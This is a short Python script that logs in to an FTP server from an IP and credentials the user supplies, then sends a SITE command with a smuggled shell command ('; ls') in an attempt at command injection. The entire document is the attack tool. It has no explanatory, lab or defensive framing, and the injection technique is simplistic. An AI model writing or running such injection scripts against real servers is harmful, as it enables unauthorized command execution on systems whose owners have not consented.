from ftplib import FTP

def ftp_command_injection(target, username, password, payload):
    try:
        ftp = FTP(target)
        ftp.login(user=username, passwd=password)
        
        response = ftp.sendcmd(f"SITE {payload}")
        print(f"Command executed: {payload}")
        print(f"Response: {response}")
        
        ftp.quit()
    except Exception as e:
        print(f"Error: {e}. Command injection failed.")

target = input("Enter FTP server IP: ")
username = input("Enter FTP username: ")
password = input("Enter FTP password: ")
payload = "; ls" 
ftp_command_injection(target, username, password, payload)
